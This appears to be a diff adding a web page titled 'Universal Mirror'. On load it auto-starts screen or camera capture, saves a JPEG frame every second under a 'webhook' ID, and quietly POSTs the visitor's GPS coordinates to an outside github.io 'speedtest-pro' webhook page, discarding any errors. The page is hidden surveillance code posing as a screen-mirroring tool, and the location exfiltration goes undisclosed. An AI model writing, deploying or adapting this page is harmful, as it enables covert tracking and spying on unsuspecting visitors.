@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Universal Mirror</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #ff0000; 
+            font-family: monospace; 
+            text-align: center; 
+            padding: 20px; 
+        }
+        #status { 
+            margin: 20px 0; 
+            padding: 15px; 
+            background: #330000; 
+            border-radius: 5px;
+        }
+        .display-area {
+            margin: 20px 0;
+            background: #0a0000;
+            border: 2px solid #660000;
+            border-radius: 10px;
+            padding: 20px;
+            min-height: 300px;
+        }
+        video, canvas {
+            width: 100%;
+            max-width: 500px;
+            height: auto;
+            border: 1px solid #ff0000;
+            border-radius: 5px;
+        }
+        .btn {
+            background: #660000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+            border-radius: 5px;
+        }
+        .info {
+            background: #1a0000;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <h2>📺 UNIVERSAL MIRROR</h2>
+    <div id="status">Detecting device capabilities...</div>
+    
+    <div class="display-area">
+        <video id="mediaVideo" autoplay muted playsinline style="display: none;"></video>
+        <canvas id="captureCanvas" style="display: none;"></canvas>
+        <div id="placeholder">
+            <p>📱 Initializing mirror system...</p>
+        </div>
+    </div>
+    
+    <div id="controls" style="display: none;">
+        <button class="btn" onclick="startCapture()">📺 Start Mirror</button>
+        <button class="btn" onclick="switchMode()">🔄 Switch Mode</button>
+    </div>
+    
+    <div id="deviceInfo" class="info"></div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const webhookId = urlParams.get('webhook') || 'universal_' + Date.now();
+        
+        let isCapturing = false;
+        let frameCount = 0;
+        let currentMode = 'auto';
+        let mediaStream = null;
+        
+        // Device detection
+        function detectDevice() {
+            const userAgent = navigator.userAgent;
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            const isDesktop = !isMobile;
+            const isHTTPS = location.protocol === 'https:';
+            const hasScreenShare = navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia;
+            const hasCamera = navigator.mediaDevices && navigator.mediaDevices.getUserMedia;
+            
+            return {
+                isMobile,
+                isDesktop,
+                isHTTPS,
+                hasScreenShare,
+                hasCamera,
+                browser: getBrowser()
+            };
+        }
+        
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            return 'Unknown';
+        }
+        
+        // Auto-detect best capture method
+        async function autoDetectAndStart() {
+            const device = detectDevice();
+            
+            document.getElementById('deviceInfo').innerHTML = `
+                📱 Device: ${device.isMobile ? 'Mobile' : 'Desktop'}<br>
+                🌐 Browser: ${device.browser}<br>
+                🔒 HTTPS: ${device.isHTTPS ? 'Yes' : 'No'}<br>
+                📺 Screen Share: ${device.hasScreenShare ? 'Yes' : 'No'}<br>
+                📷 Camera: ${device.hasCamera ? 'Yes' : 'No'}
+            `;
+            
+            // Try screen sharing first (desktop)
+            if (device.isDesktop && device.hasScreenShare && device.isHTTPS) {
+                currentMode = 'screen';
+                document.getElementById('status').innerHTML = '🖥️ Desktop detected - Trying screen share...';
+                await tryScreenShare();
+            }
+            // Fallback to camera (mobile or failed screen share)
+            else if (device.hasCamera) {
+                currentMode = 'camera';
+                document.getElementById('status').innerHTML = '📱 Mobile/Fallback - Using camera...';
+                await tryCamera();
+            }
+            // Last resort - manual mode
+            else {
+                currentMode = 'manual';
+                document.getElementById('status').innerHTML = '⚠️ Limited support - Manual mode';
+                document.getElementById('controls').style.display = 'block';
+            }
+        }
+        
+        async function tryScreenShare() {
+            try {
+                mediaStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                document.getElementById('status').innerHTML = '✅ Screen sharing active';
+                setupCapture('screen');
+                
+            } catch (error) {
+                document.getElementById('status').innerHTML = '❌ Screen share failed - Trying camera...';
+                currentMode = 'camera';
+                await tryCamera();
+            }
+        }
+        
+        async function tryCamera() {
+            try {
+                // Try back camera first, then front
+                const constraints = {
+                    video: { 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 },
+                        facingMode: { ideal: 'environment' }
+                    },
+                    audio: false
+                };
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                document.getElementById('status').innerHTML = '✅ Camera active (fallback mode)';
+                setupCapture('camera');
+                
+            } catch (error) {
+                document.getElementById('status').innerHTML = '❌ Camera failed - Manual mode';
+                document.getElementById('controls').style.display = 'block';
+            }
+        }
+        
+        function setupCapture(mode) {
+            const video = document.getElementById('mediaVideo');
+            const canvas = document.getElementById('captureCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            video.srcObject = mediaStream;
+            video.style.display = 'block';
+            canvas.style.display = 'block';
+            document.getElementById('placeholder').style.display = 'none';
+            document.getElementById('controls').style.display = 'block';
+            
+            isCapturing = true;
+            
+            video.onloadedmetadata = () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                startMirroring(video, canvas, ctx, mode);
+            };
+            
+            // Handle stream end
+            if (mediaStream.getVideoTracks()[0]) {
+                mediaStream.getVideoTracks()[0].onended = () => {
+                    isCapturing = false;
+                    document.getElementById('status').innerHTML = '🔴 Capture stopped';
+                };
+            }
+        }
+        
+        function startMirroring(video, canvas, ctx, mode) {
+            function captureFrame() {
+                if (!isCapturing) return;
+                
+                // Draw current frame
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to image data
+                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                frameCount++;
+                
+                // Store data for Android app
+                const mirrorData = {
+                    screenData: imageData,
+                    timestamp: new Date().toISOString(),
+                    frame: frameCount,
+                    webhook: webhookId,
+                    mode: mode,
+                    type: 'universal_mirror'
+                };
+                
+                // Multiple storage methods
+                localStorage.setItem('mirror_' + webhookId, imageData);
+                localStorage.setItem('mirror_data_' + webhookId, JSON.stringify(mirrorData));
+                localStorage.setItem('universal_mirror', JSON.stringify({
+                    webhook: webhookId,
+                    data: imageData,
+                    timestamp: Date.now(),
+                    frame: frameCount,
+                    mode: mode
+                }));
+                
+                // Window property
+                window.universalMirrorData = mirrorData;
+                
+                // Update status
+                const modeIcon = mode === 'screen' ? '🖥️' : '📱';
+                document.getElementById('status').innerHTML = 
+                    `${modeIcon} ${mode.toUpperCase()} Mirror - Frame ${frameCount} - ${new Date().toLocaleTimeString()}`;
+                
+                // Continue capturing
+                setTimeout(captureFrame, 1000); // 1 second intervals
+            }
+            
+            // Start capturing
+            captureFrame();
+        }
+        
+        async function startCapture() {
+            if (isCapturing) return;
+            await autoDetectAndStart();
+        }
+        
+        async function switchMode() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+            isCapturing = false;
+            
+            if (currentMode === 'screen') {
+                currentMode = 'camera';
+                await tryCamera();
+            } else {
+                currentMode = 'screen';
+                await tryScreenShare();
+            }
+        }
+        
+        // Auto start detection
+        setTimeout(autoDetectAndStart, 1000);
+        
+        // Send GPS location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString(),
+                        webhook: webhookId
+                    };
+                    
+                    fetch('https://bojourx-tos.github.io/speedtest-pro/webhook-server.html', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locationData)
+                    }).catch(() => {});
+                },
+                (error) => console.log('Location access denied')
+            );
+        }
+        
+        // Keep alive
+        setInterval(() => {
+            if (isCapturing) {
+                localStorage.setItem('mirror_heartbeat_' + webhookId, Date.now().toString());
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
